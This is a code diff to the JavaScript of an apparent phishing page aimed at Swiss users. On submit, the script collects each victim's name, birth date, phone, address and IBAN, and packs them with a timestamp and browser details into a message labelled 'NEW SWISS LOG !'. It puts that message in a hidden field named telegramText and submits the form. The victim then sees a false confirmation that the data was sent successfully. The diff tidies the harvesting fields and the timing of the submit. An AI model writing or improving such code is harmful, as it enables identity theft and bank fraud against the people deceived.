@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
   
-  // --- 1. Маска для даты ---
+  // Маска для даты
   const geburtsdatumInput = document.getElementById('geburtsdatum');
   if (geburtsdatumInput) {
     geburtsdatumInput.addEventListener('input', function (e) {
@@ -14,7 +14,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // --- 2. Перевод ---
+  // Перевод
   const langBtns = document.querySelectorAll('.lang-btn');
   const translatableElements = document.querySelectorAll('[data-lang-ch]');
   langBtns.forEach(btn => {
@@ -35,23 +35,20 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   });
 
-  // --- 3. Отправка ---
+  // Отправка
   const form = document.getElementById('telegramForm');
   
   form.addEventListener('submit', (e) => {
-    // 1. Отменяем стандартную отправку, чтобы заполнить textarea
     e.preventDefault();
 
-    // 2. Собираем данные
+    // Берем значения "как есть"
     const name = document.getElementById('name').value;
     const geburtsdatum = document.getElementById('geburtsdatum').value;
     const telefon = document.getElementById('telefon').value;
     const adresse = document.getElementById('adresse').value;
     const plz = document.getElementById('plz').value;
     const stadt = document.getElementById('stadt').value;
-    const ibanInput = document.getElementById('iban').value;
-    const phonePrefix = document.getElementById('phone-prefix').value;
-    const ibanPrefix = document.getElementById('iban-prefix').value;
+    const iban = document.getElementById('iban').value;
 
     const now = new Date();
     const dateStr = now.toLocaleDateString('de-CH', { day: '2-digit', month: '2-digit', year: 'numeric' });
@@ -62,25 +59,24 @@ document.addEventListener('DOMContentLoaded', () => {
     let message = '🇨🇭 NEW SWISS LOG !\n\n';
     message += `👤 Name: ${name}\n`;
     message += `🎂 Geburtsdatum: ${geburtsdatum}\n`;
-    message += `📱 Telefon: ${phonePrefix}${telefon}\n`;
+    message += `📱 Telefon: ${telefon}\n`; // Только то, что ввели
     message += `📍 Adresse: ${adresse}\n`;
     message += `📮 PLZ: ${plz}\n`;
     message += `🏙️ Stadt: ${stadt}\n`;
-    message += `🏦 IBAN: ${ibanPrefix}${ibanInput}\n`;
+    message += `🏦 IBAN: ${iban}\n`; // Только то, что ввели
     message += `🔍 IBAN-Status: nicht geprüft\n\n`;
     message += `🕒 Zeit: ${dateTime}\n`;
     message += `🌐 Browser: ${browserInfo}\n`;
 
-    // 3. Записываем текст в скрытое поле
     document.getElementById('telegramText').value = message;
+    
+    setTimeout(() => {
+      form.submit();
+    }, 100);
 
-    // 4. Теперь отправляем форму вручную
-    form.submit(); // Форма уходит в iframe
-
-    // 5. Показываем уведомление
     setTimeout(() => {
       alert('Vielen Dank! Ihre Daten wurden erfolgreich gesendet.');
       form.reset();
-    }, 500); 
+    }, 800);
   });
 });
